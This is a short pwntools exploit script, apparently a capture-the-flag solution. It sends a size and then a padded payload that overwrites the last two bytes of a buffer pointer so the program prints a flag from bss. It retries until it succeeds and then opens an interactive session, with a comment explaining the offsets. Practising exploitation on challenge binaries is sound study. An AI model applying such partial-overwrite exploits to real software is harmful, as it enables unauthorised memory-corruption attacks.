from pwn import *
from grwnapy.pwn import find_offset


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

if args.REMOTE:
    exe = "/home/grwcha/grwna/.example_elf"
else:
    exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# start
input_buf = 0x98
pass_buf = 0x18

size = input_buf-pass_buf

while True:
    io = start()

    payload_size = flat([str(size*2).encode()])

    io.sendlineafter(b'', payload_size)

    payload = flat([
            (size)*"a", 
            b'\x40',
            b'\xa0',
                    ])
    io.sendafter(b'', payload)
    data = io.recvall()
    if b"pwn" in data:
        print(data)
        io.interactive()



"""
Overwrite the last two bytes of the printed buffer to the address of the flag
In the easy chall the printed buffer is x1c4 while flag is x060
In the easy chall the printed buffer is x1b8 while flag is x040
The flag is put directly to the start of bssdata
"""